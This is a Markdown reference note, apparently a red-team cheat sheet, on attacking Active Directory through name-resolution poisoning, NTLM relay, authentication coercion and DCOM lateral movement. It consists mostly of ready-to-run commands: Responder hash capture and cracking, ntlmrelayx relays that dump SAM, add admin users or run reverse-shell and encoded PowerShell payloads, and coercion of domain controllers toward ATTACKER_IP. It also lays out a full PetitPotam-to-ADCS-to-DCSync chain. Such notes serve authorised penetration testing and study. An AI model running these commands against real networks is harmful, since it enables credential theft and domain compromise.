---
title: "Active Directory MITM and NTLM Relay Attacks Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - ntlm-relay
  - mitm
  - responder
  - coercion
---

# Active Directory MITM and NTLM Relay Attacks Reference

Reference for MITM, LLMNR/NBNS/mDNS poisoning, NTLM relay, and coercion attacks. See also: [[AD-Credential-Attacks]], [[AD-ADCS-Certificate-Services]], [[AD-Kerberos-Attacks]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#LLMNR / NBNS / mDNS Poisoning]]
- [[#Responder]]
- [[#NTLM Relay with ntlmrelayx]]
- [[#SMB Relay]]
- [[#LDAP Relay]]
- [[#mitm6 (IPv6 Poisoning)]]
- [[#WebDAV Trick]]
- [[#Coercion Attacks]]
- [[#RemotePotato0]]
- [[#DCOM Lateral Movement]]
- [[#pyrdp-mitm]]

---

## LLMNR / NBNS / mDNS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBNS) are broadcast-based name resolution protocols. When a host fails DNS resolution, it falls back to these. An attacker on the same network can respond to these queries and capture NTLM hashes.

**Key concepts:**
- LLMNR uses UDP port 5355
- NBNS uses UDP port 137
- mDNS uses UDP port 5353
- Only works on local network segment

---

## Responder

```bash
# Basic - listen and poison
responder -I eth0

# With verbose output
responder -I eth0 -v

# With WPAD/proxy poisoning
responder -I eth0 -w

# With WPAD + force WPAD auth
responder -I eth0 -w -F

# With SMB signing bypass workaround
responder -I eth0 -b

# Behind proxy
responder -I eth0 -P

# Downgrade to LM (older)
responder -I eth0 --lm

# Disable SMB and HTTP (to use ntlmrelayx instead of capturing)
responder -I eth0 -P -v
# Edit Responder.conf: SMB = Off, HTTP = Off
```

```bash
# Configuration file
cat /usr/share/responder/Responder.conf
# Key settings:
# SMB = On/Off
# HTTP = On/Off
# Challenge = 1122334455667788 (for NTLMv1 optimization)
```

### View captured hashes

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
cat /usr/share/responder/logs/*.txt

# Crack with hashcat
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## NTLM Relay with ntlmrelayx

When SMB signing is disabled on target, relay captured NTLM auth to other hosts.

### Check SMB Signing

```bash
netexec smb <CIDR> --gen-relay-list relay_targets.txt
netexec smb <IP> -u '' -p '' --shares  # Check signing status in output
nmap --script smb-security-mode <IP>
```

### Basic NTLM Relay

```bash
# Step 1: Disable SMB/HTTP in Responder
# Responder.conf: SMB = Off, HTTP = Off

# Step 2: Start Responder for poisoning
responder -I eth0 -v

# Step 3: Start ntlmrelayx targeting hosts without SMB signing
ntlmrelayx.py -tf relay_targets.txt -smb2support
ntlmrelayx.py -t smb://<TARGET_IP> -smb2support

# Execute command on relay
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

# Run PowerShell payload
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc BASE64PAYLOAD"
```

### NTLM Relay Options

```bash
# Dump SAM
ntlmrelayx.py -t smb://<TARGET_IP> -smb2support --sam

# Create new admin user
ntlmrelayx.py -t smb://<TARGET_IP> -smb2support --add-computer attacker-pc

# LDAP relay (for creating accounts, ACL changes)
ntlmrelayx.py -t ldap://<DC_IP> -smb2support

# LDAP relay with escalation
ntlmrelayx.py -t ldap://<DC_IP> -smb2support --escalate-user jdoe

# ADCS relay (ESC8)
ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# LDAPS relay (add user to DA)
ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --add-computer attacker-pc --delegate-access

# SOCKS proxy mode (persistent relay sessions)
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
# In another terminal:
proxychains impacket-secretsdump -no-pass corp.local/administrator@<TARGET_IP>
```

---

## SMB Relay

```bash
# Setup: Disable Responder's SMB, start relay
ntlmrelayx.py -t smb://<TARGET> -smb2support -e /tmp/reverse.exe
# OR execute inline
ntlmrelayx.py -t smb://<TARGET> -smb2support -c "net localgroup administrators jdoe /add"

# MultiRelay (older, part of Responder)
python MultiRelay.py -t <TARGET> -u ALL
```

---

## LDAP Relay

Relay NTLM auth to LDAP to modify directory objects.

```bash
# Relay to LDAP - dump info
ntlmrelayx.py -t ldap://<DC_IP> -smb2support --no-dump --dump-laps --dump-adcs --dump-gmsa

# Add shadow credentials
ntlmrelayx.py -t ldap://<DC_IP> --shadow-credentials --shadow-target victim

# Relay computer account auth to LDAP for RBCD
ntlmrelayx.py -t ldap://<DC_IP> -smb2support --delegate-access

# Escalate user privileges via LDAP
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user jdoe
```

---

## mitm6

Exploit Windows' preference for IPv6 over IPv4 by advertising a rogue IPv6 DNS server. Intercepts DNS queries and relays authentication to LDAP.

```bash
# Step 1: Start mitm6 (requires Python3 + privileges)
mitm6 -d corp.local

# Step 2: Start ntlmrelayx targeting LDAP
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fake.corp.local -l /tmp/loot

# With WPAD
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh wpad.corp.local --add-computer attacker$ --delegate-access

# Combined attack for DA
mitm6 -d corp.local &
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh wpad.corp.local --escalate-user jdoe
```

---

## WebDAV Trick

WebDAV authentication uses HTTP NTLM, which can be relayed. When a target accesses a UNC path via WebDAV, the NTLM credentials can be captured.

```bash
# Coerce WebDAV authentication from target
# On attacker: Start Responder (HTTP on) or ntlmrelayx
ntlmrelayx.py -t ldap://<DC_IP> -smb2support

# Trigger WebDAV connection from target
# If target has WebClient service running:
dir \\ATTACKER_IP@80\share\file

# Or via RPC coercion to WebDAV path
python3 printerbug.py corp.local/jdoe:password@<DC_IP> "\\<ATTACKER_IP>@80\\share"
```

```powershell
# Check if WebClient is running
Get-Service WebClient
sc.exe query webclient
```

---

## Coercion Attacks

Force computers (often DCs) to authenticate to an attacker-controlled host, capturing or relaying NTLM credentials.

### PrinterBug (MS-RPRN)

```bash
python3 printerbug.py corp.local/jdoe:password@<TARGET_IP> <ATTACKER_IP>
# Windows: .\SpoolSample.exe <TARGET_IP> <ATTACKER_IP>
```

### PetitPotam (MS-EFSRPC)

```bash
# Unauthenticated (patched on DCs in newer Windows)
python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>

# Authenticated
python3 PetitPotam.py -u jdoe -p password -d corp.local <ATTACKER_IP> <TARGET_IP>
```

### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u jdoe -p password -d corp.local <ATTACKER_IP> <TARGET_IP>
```

### Coercer (All methods combined)

```bash
# Scan for coerceable hosts
coercer scan -t <TARGET_IP> -u jdoe -p password -d corp.local

# Coerce authentication
coercer coerce -l <ATTACKER_IP> -t <TARGET_IP> -u jdoe -p password -d corp.local
coercer coerce -l <ATTACKER_IP> -t <TARGET_IP> -u jdoe -p password -d corp.local --filter-method-name "EfsRpcOpenFileRaw"
```

### Typical Combined Attack (PetitPotam + ADCS ESC8)

```bash
# Step 1: Start ntlmrelayx targeting ADCS HTTP enrollment
ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Step 3: Receive base64 certificate from ntlmrelayx
# Step 4: Authenticate with DC certificate
python3 gettgtpkinit.py -pfx-base64 <BASE64_CERT> corp.local/DC01$ dc01.ccache
export KRB5CCNAME=dc01.ccache
python3 getnthash.py corp.local/DC01$ -key <AS_REP_KEY>

# Step 5: DCSync
impacket-secretsdump -hashes :MACHINE_NTLM corp.local/DC01$@dc01.corp.local
```

---

## RemotePotato0

Abuses DCOM activation to perform cross-session NTLM relay in a multi-session environment.

```powershell
# On victim (with high-privilege session present):
.\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -p 9998 -s 1

# On attacker: ntlmrelayx listening
ntlmrelayx.py -t ldap://<DC_IP> -smb2support
```

---

## DCOM Lateral Movement

Distributed Component Object Model (DCOM) can be used for lateral movement without SMB.

```bash
# dcomexec.py (impacket)
impacket-dcomexec corp.local/administrator:password@<TARGET_IP> "whoami"
impacket-dcomexec corp.local/administrator:password@<TARGET_IP> "whoami" -object MMC20

# With hash
impacket-dcomexec corp.local/administrator@<TARGET_IP> "whoami" -hashes :NTLMHASH
```

```powershell
# Native PowerShell DCOM
$dcom = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd","/c","whoami > C:\output.txt","7")

# Invoke-DCOM (PowerSploit)
Invoke-DCOM -ComputerName <TARGET_IP> -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName <TARGET_IP> -Method ShellWindows -Command "calc.exe"
Invoke-DCOM -ComputerName <TARGET_IP> -Method ShellBrowserWindow -Command "calc.exe"
```

### DCOM Objects Useful for Lateral Movement

| Object | Description |
|--------|-------------|
| MMC20.Application | Microsoft Management Console |
| ShellWindows | Windows Explorer |
| ShellBrowserWindow | IE/Explorer COM object |
| Excel.Application | Microsoft Excel |
| Visio.InvisibleApp | Microsoft Visio |
| Word.Application | Microsoft Word |

---

## pyrdp-mitm

RDP MITM proxy for credential capture.

```bash
# Start RDP MITM
pyrdp-mitm <TARGET_IP>:3389 -l 3389

# View captured credentials
pyrdp-player replay.pyrdp
```
